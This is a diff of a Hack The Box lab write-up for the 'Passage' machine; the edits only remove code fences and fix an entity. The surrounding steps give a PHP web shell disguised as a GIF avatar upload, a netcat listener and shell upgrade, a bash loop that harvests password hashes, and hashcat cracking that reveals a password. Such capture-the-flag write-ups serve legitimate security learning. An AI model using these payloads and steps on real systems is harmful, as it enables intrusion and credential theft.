@@ -14,10 +14,8 @@ This machine is currently active, and is my first attempt at HTB.  Its IP addres
   4.  Go to `http://passage:80/CuteNews/` and create an account;
   5.  Edit your account by uploading an avatar "photo", which is really just a file containing:
     
-    ```
     GIF8;
     <?php system($_REQUEST['cmd']) ?>
-    ```
     
   6.  Go to `http://passage:80/CuteNews/uploads/`, and click on your recently uploaded PHP file;
   7.  Run `nc -nlvp 1234` in a terminal window;
@@ -26,9 +24,7 @@ This machine is currently active, and is my first attempt at HTB.  Its IP addres
   10. Go back to your terminal and run `python3 -c 'import pty; pty.spawn("/bin/bash")'` to gain access to a shell;
   11. Now that you have access, you need some passwords.  There are some hashed passwords, encoded using `base64`, in the `/var/www/html/CuteNews/cdata/users/` directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
     
-    ```
     for i in /var/www/html/CuteNews/cdata/users/*.php; do DECODED="$(tail -n 1 "$i" | base64 -d 2>/dev/null)"; RET_VAL=$?; if [ $RET_VAL -eq 0 ]; then HASH="$(echo "$DECODED" | awk -F'64:' '{print $2}' | awk -F';' '{print $1}' | tr -d '"' | sed '/^$/d')"; if [[ ! -z "${HASH}" ]]; then NAME="$(echo "$DECODED" | awk -F'"email"' '{print $2}' | awk -F'@' '{print $1}' | awk -F'"' '{print $2}' | tr -d '"' | sed '/^$/d')"; echo -e "${NAME}\n${HASH}\n"; fi; fi; done
-    ```
     
     You could also parse the `/var/www/html/CuteNews/cdata/users/lines` file using `while read`, as I think that has the same content.
   12. You will now need to choose a hash and decode it.  For me, `paul`'s hash worked.  I checked `hash-identify` to see that it was likely `SHA-256`, and thus ran `hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt && hashcat --show -m 1400 "$OUR_HASH"`: we see the password is `atlanta1`.  (Thank you, Paul, for having a terrible password);
@@ -597,4 +593,4 @@ sshd:*:18464:0:99999:7:::
 
 ---
 
-One big take-home message from this&emdash; my first HTB task&mdash; is: just Google!  Unless you think you have a great idea what to try, if you are only starting out
+One big take-home message from this&mdash; my first HTB task&mdash; is: just Google!  Unless you think you have a great idea what to try, if you are only starting out
